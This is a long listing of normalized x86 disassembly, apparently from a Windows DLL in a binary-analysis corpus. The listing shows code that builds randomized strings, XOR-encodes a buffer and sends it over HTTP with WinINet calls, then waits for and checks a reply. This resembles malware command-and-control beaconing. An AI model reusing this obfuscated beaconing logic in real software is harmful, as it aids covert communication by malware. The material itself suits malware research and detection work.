jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov ecx esi
call sub_10007470
push edi
call sub_1001a3eb
add esp 0x4
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x4 ] 0x0
call [ GetTickCount@IAT ]
mov ebx eax
call sub_1001aec0
add ebx eax
push ebx
call sub_1001aeae
lea ecx [ ebp - 0x4 ]
push ecx
call sub_1001adbe
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
and eax 0x3f
mov [ ebp - 0x4 ] eax
mov al [ edx + eax + 0x41 ]
mov [ esi + edi ] al
inc esi
add esp 0x8
cmp esi [ ebp + 0xc ]
jb r-xdata
sub_10011080
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d184
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0xe4 ] ecx
mov [ ebp - 0xf0 ] esi
mov [ ebp - 0xec ] ebx
push 0x18
mov [ ebp - 0x4 ] 0x1
call sub_1001a818
add esp 0x4
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10012700
jmp r-xdata
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x64 ]
push ecx
lea edx [ ebp - 0x80 ]
push edx
call sub_1000cc60
add esp 0xc
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0xb
call sub_10006f30
cmp [ ebp - 0x6c ] 0x10
jmp r-xdata
mov [ ebp - 0xe8 ] eax
jmp r-xdata
push 0xc
push rw-data
mov ecx eax
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_10012790
mov [ ebp - 0xd8 ] ebx
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea eax [ ebp - 0xd8 ]
push eax
call sub_1001adbe
mov ecx [ ebp - 0xd8 ]
mov edi [ ebp - 0xe0 ]
mov eax 0x24924925
mul ecx
mov eax ecx
sub eax edx
shr eax 0x1
add eax edx
shr eax 0x2
lea edx [ eax * 8 ]
sub edx eax
sub ecx edx
add esp 0x8
lea eax [ ecx + ecx * 4 ]
lea ecx [ eax * 4 + rw-data ]
push 0x14
push ecx
mov ecx edi
call sub_10012770
lea edx [ ebp - 0xb8 ]
push edx
mov ecx edi
call sub_10012d50
push 0xffffffff
push ebx
lea eax [ ebp - 0xb8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
mov [ esi ] bl
call sub_10007380
push 0x4
push rw-data
mov ecx edi
mov [ ebp - 0xec ] 0x1
call sub_10012770
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_10012d50
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0xd9 ] bl
mov [ ebp - 0xd8 ] ebx
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea edx [ ebp - 0xd8 ]
push edx
call sub_1001adbe
mov eax [ ebp - 0xd8 ]
xor edx edx
mov ecx 0x9
div ecx
add esp 0x8
add edx 0x2
movzx eax dl
dec eax
cmp eax ebx
jle r-xdata
mov [ ebp - 0x4 ] 0x4
jb r-xdata
mov [ ebp - 0xd8 ] ebx
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea edx [ ebp - 0xd8 ]
push edx
call sub_1001adbe
mov eax [ ebp - 0xd8 ]
xor edx edx
mov ecx 0xb
div ecx
mov edi [ ebp - 0xe0 ]
add esp 0x8
push 0xf
mov ecx edi
mov eax edx
shl eax 0x4
sub eax edx
add eax rw-data
push eax
call sub_10012770
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
call sub_10012d50
cmp [ ebp - 0x50 ] 0x10
mov edx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x5
jae r-xdata
mov edi [ ebp - 0xe0 ]
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_10019ce4
add esp 0x4
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x54 ]
cmp edi ecx
jae r-xdata
lea edx [ ebp - 0x64 ]
mov edi 0x10
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10019ce4
add esp 0x4
push ecx
push edx
push eax
call sub_100107f0
mov ecx [ ebp - 0x54 ]
add esp 0xc
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0xa4 ] 0xf
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp + 0x20 ] edi
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_10019ce4
add esp 0x4
sete al
cmp al bl
je r-xdata
cmp edi ecx
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x50 ] 0x10
mov edx [ ebp - 0x64 ]
jae r-xdata
cmp [ ebp - 0xd9 ] bl
jne r-xdata
xor eax eax
cmp edi ecx
setne al
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jae r-xdata
lea edx [ ebp - 0x64 ]
lea edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x80 ]
push ecx
mov [ ebp - 0xd9 ] 0x1
call sub_1000cc60
push rw-data
push eax
lea edx [ ebp - 0x48 ]
push edx
mov [ ebp - 0x4 ] 0x6
call sub_1000cd20
add esp 0x18
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x7
call sub_10006f30
mov edi 0x10
cmp [ ebp - 0x34 ] edi
jb r-xdata
cmp eax ebx
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx edi
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
jmp r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10019ce4
add esp 0x4
push ecx
push edx
push eax
call sub_100107f0
add esp 0xc
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x6c ] edi
jb r-xdata
sete al
cmp al bl
sete al
cmp al bl
je r-xdata
mov eax [ ebp - 0x54 ]
cmp edi eax
jae r-xdata
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_10019ce4
add esp 0x4
jmp r-xdata
mov edi 0x10
mov [ ebp - 0xd8 ] ebx
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea edx [ ebp - 0xd8 ]
push edx
call sub_1001adbe
mov ecx [ ebp - 0xd8 ]
mov eax 0x4ec4ec4f
mul ecx
shr edx 0x2
imul edx edx 0xd
mov eax 0x1
sub eax edx
add ecx eax
add esp 0x8
push ecx
mov [ ebp - 0xd8 ] ecx
lea ecx [ ebp - 0x80 ]
push ecx
mov ecx [ ebp - 0xe4 ]
call sub_10010fc0
push eax
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_10010e70
push rw-data
push eax
lea ecx [ ebp - 0x48 ]
push ecx
mov [ ebp - 0x4 ] 0x9
call sub_1000cd20
add esp 0x18
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0xa
call sub_10006f30
mov edi 0x10
cmp [ ebp - 0x34 ] edi
jb r-xdata
xor ecx ecx
cmp edi eax
setne cl
mov eax ecx
or eax 0xffffffff
jmp r-xdata
dec [ ebp - 0xe8 ]
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
cmp eax ebx
cmp [ ebp - 0xd9 ] bl
jne r-xdata
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
mov eax [ ebp - 0x9c ]
push eax
call sub_10019ce4
add esp 0x4
push 0x1
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10007470
mov [ ebp - 0x4 ] 0xc
mov [ ebp - 0xd8 ] ebx
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea ecx [ ebp - 0xd8 ]
push ecx
call sub_1001adbe
mov ecx [ ebp - 0xd8 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax 0x3
sub eax edx
add ecx eax
add esp 0x8
push ecx
mov [ ebp - 0xd8 ] ecx
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx [ ebp - 0xe4 ]
call sub_10010fc0
lea edx [ ebp - 0x2c ]
push edx
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10007a50
add esp 0xc
cmp [ ebp - 0x88 ] 0x10
jb r-xdata
mov edi 0xf
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x4 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10019ce4
add esp 0x4
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0xd8 ] ebx
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea eax [ ebp - 0xd8 ]
push eax
call sub_1001adbe
mov ecx [ ebp - 0xd8 ]
mov eax 0x4ec4ec4f
mul ecx
shr edx 0x2
imul edx edx 0xd
mov eax 0x1
sub eax edx
add ecx eax
add esp 0x8
push ecx
mov [ ebp - 0xd8 ] ecx
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx [ ebp - 0xe4 ]
call sub_10010fc0
push eax
lea edx [ ebp - 0x80 ]
push edx
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_10010e70
add esp 0xc
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x12
call sub_10006f30
mov edi 0x10
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x6c ] edi
mov edx [ ebp - 0xd4 ]
push edx
call sub_10019ce4
add esp 0x4
sub_10011740
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d1bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
xor esi esi
push 0x18
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] esi
call sub_1001a818
add esp 0x4
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x30 ]
push ecx
push edi
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012bd0
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
mov edx [ rw-data ]
mov ecx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x2c ]
push eax
call sub_10010fc0
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x1c ]
mov edx [ ebp - 0x34 ]
lea eax [ edi + ecx ]
push 0x1
push eax
mov [ edx ] eax
call sub_1001a8ef
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push edi
push eax
push edi
push esi
call sub_1001a92f
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
push eax
push ebx
push eax
add ecx esi
push ecx
call sub_1001a92f
push ebx
call sub_1001a3eb
add esp 0x24
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov eax esi
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0xc
sub_10011870
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d209
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] eax
mov esi ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x4c ] eax
call [ GetTickCount@IAT ]
mov ebx eax
call sub_1001aec0
add ebx eax
push ebx
call sub_1001aeae
lea eax [ ebp - 0x4c ]
push eax
call sub_1001adbe
mov ecx [ ebp - 0x4c ]
mov eax ecx
xor edx edx
or ebx 0xffffffff
div ebx
mov edx [ esi + 0x18 ]
push 0x7
push rw-data
push 0x7
add ecx eax
mov [ edx ] ecx
mov eax [ esi + 0x18 ]
add eax 0x4
push eax
call sub_1001a92f
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x18 ]
mov [ ecx + 0xb ] edx
mov eax [ esi + 0x1c ]
add esp 0x18
xor ebx ebx
xor dl dl
sub eax 0x4
je r-xdata
mov edx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
push edx
push eax
push edi
mov ecx esi
call sub_10010ec0
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x50 ] 0x1
call sub_10010fc0
push edi
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000cd20
add esp 0xc
mov esi eax
cmp edi esi
je r-xdata
xor eax eax
mov edi edi
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx [ esi + 0x18 ]
mov ebx eax
and ebx 0x3
mov bl [ ebx + ecx ]
xor [ ecx + eax + 0x4 ] bl
mov ecx [ esi + 0x1c ]
inc dl
movzx eax dl
sub ecx 0x4
cmp eax ecx
jb r-xdata
xor ebx ebx
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ edi ]
push eax
call sub_10019ce4
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
mov ecx [ esi ]
mov [ edi ] ecx
mov [ esi ] ebx
mov eax [ esi + 0x10 ]
inc eax
push eax
push esi
push edi
call sub_1001a060
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edi + 0x10 ] edx
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
sub_10011a20
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea eax [ ebx + 0xb ]
push 0x1
push eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1001a8ef
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push edi
mov [ ebp + 0xc ] 0x0
call [ GetTickCount@IAT ]
mov edi eax
call sub_1001aec0
add edi eax
push edi
call sub_1001aeae
lea eax [ ebp + 0xc ]
push eax
call sub_1001adbe
mov ecx [ ebp + 0xc ]
mov eax ecx
xor edx edx
or edi 0xffffffff
div edi
push 0x7
push rw-data
lea edi [ esi + 0x4 ]
push 0x7
push edi
add eax ecx
mov [ esi ] eax
call sub_1001a92f
mov ecx [ ebp + 0x8 ]
push ebx
push ecx
lea edx [ esi + 0xb ]
push ebx
push edx
call sub_1001a92f
mov ecx 0xfffffffc
add esp 0x28
mov eax edi
sub ecx esi
mov edi 0xb
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
lea edx [ ecx + eax ]
and edx 0x3
mov dl [ edx + esi ]
xor [ eax ] dl
inc eax
dec edi
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
push eax
push ecx
mov ecx [ ebp - 0x8 ]
push esi
call sub_10011740
push esi
mov edi eax
call sub_1001a3eb
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_10011af0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d238
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi ecx
push eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
mov [ ebp - 0x30 ] 0x0
call sub_10011870
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x30 ] esp
push 0xffffffff
push 0x0
lea edx [ ebp - 0x2c ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] 0x0
call sub_10007380
push edi
mov ecx esi
call sub_10011080
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
sub_10011ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d270
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x40 ] esi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
cmp [ eax + 0x4 ] 0x4
jb r-xdata
xor al al
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
or eax 0xffffffff
mov ecx [ rw-data ]
mov eax [ eax + ecx ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov [ ebp - 0x34 ] ebx
cmp [ rw-data ] ebx
jbe r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push eax
lea edx [ ebp - 0x2c ]
push edx
mov ecx esi
call sub_10011af0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
lea edx [ ebp - 0x44 ]
push edx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] ebx
call sub_10011a20
mov [ ebp - 0x3c ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_1001a3eb
add esp 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
jmp r-xdata
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
call sub_100132b0
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov esi [ ebp + 0xc ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
push ebx
push ebx
push ebx
push ebx
push r--data
call [ InternetOpenW@IAT ]
mov edi eax
mov [ ebp - 0x38 ] edi
cmp edi ebx
je r-xdata
mov al 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax [ rw-data ]
jb r-xdata
cmp [ esi + 0x34 ] 0x8
lea eax [ esi + 0x20 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x40 ]
xor ebx ebx
jmp r-xdata
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x50
push eax
push edi
call [ InternetConnectW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ eax ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push r--data
push ebx
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x40 ]
push esi
call sub_10010cc0
mov ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x3c ]
push ecx
push edx
push 0x0
push 0x0
push esi
call [ HttpSendRequestW@IAT ]
test eax eax
je r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push ebx
call esi
jmp r-xdata
push edi
mov edi [ InternetCloseHandle@IAT ]
call edi
push ebx
call edi
push esi
call edi
push 0xbb8
call [ Sleep@IAT ]
push 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x16
push esi
mov [ ebp - 0x30 ] 0x0
call [ HttpQueryInfoW@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x30 ]
push 0x1
push ecx
call sub_1001a8ef
add esp 0x8
push 0x0
lea edx [ ebp - 0x30 ]
push edx
mov edi eax
push edi
push 0x13
push esi
call [ HttpQueryInfoW@IAT ]
cmp [ edi ] 0x300032
jne r-xdata
push edi
call sub_1001a3eb
mov edi [ ebp - 0x38 ]
add esp 0x4
cmp [ edi + 0x4 ] 0x30
jne r-xdata
cmp [ edi + 0x5 ] 0x0
je r-xdata
push edi
call sub_1001a3eb
mov eax [ ebp - 0x38 ]
mov edi [ InternetCloseHandle@IAT ]
add esp 0x4
push eax
call edi
push ebx
call edi
push esi
call edi
sub_10011e90
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0xc ]
lea edx [ esi + 0x14 ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ esi + 0x8 ]
push edx
call sub_10019ce4
add esp 0x14
sub_10011ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d2a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx edi
call edx
movzx eax [ eax + 0x3 ]
cmp [ edi + 0x3c ] eax
mov eax [ ebp - 0x38 ]
sete bl
xor esi esi
cmp eax esi
je r-xdata
test bl bl
je r-xdata
mov ecx [ ebp - 0x11 ]
push ecx
mov ecx [ ebp - 0x34 ]
lea edx [ ebp - 0x2c ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ ebp - 0x38 ]
push edx
call sub_10019ce4
add esp 0x14
inc [ edi + 0x3c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx edi
mov [ edi + 0x3c ] esi
call edx
mov ecx [ ebp - 0x20 ]
mov ebx [ ebp - 0x24 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
mov [ ebp - 0x4 ] esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov [ ebp - 0xd ] 0x0
je r-xdata
movzx eax [ ebp - 0xd ]
push 0xffffffff
lea ecx [ edi + 0x20 ]
push 0x0
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
inc eax
xor edx edx
div esi
lea eax [ edx * 8 ]
sub eax edx
lea edx [ ebx + eax * 4 ]
push edx
push ebx
jmp r-xdata
mov edx [ edi + 0x30 ]
lea ecx [ eax * 8 ]
sub ecx eax
cmp [ edi + 0x34 ] 0x8
lea eax [ edi + 0x20 ]
lea ecx [ ebx + ecx * 4 ]
jb r-xdata
mov ebx [ ebp - 0x20 ]
cmp esi ebx
je r-xdata
call sub_100019e0
mov esi [ ebp - 0x24 ]
test esi esi
je r-xdata
push edx
mov edx [ ecx + 0x10 ]
push eax
push edx
push 0x0
call sub_100068a0
test eax eax
je r-xdata
mov eax [ eax ]
push esi
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebp - 0x24 ]
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax esi
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0x24 ]
sub_10012060
push ebp
mov ebp esp
push ecx
mov ax [ ecx + 0x4 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ax
mov dl [ ecx + 0x6 ]
mov [ esi + 0x2 ] dl
mov al [ ecx + 0x7 ]
add ecx 0x8
push ecx
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x3 ] al
call sub_100025c0
mov eax esi
pop esi
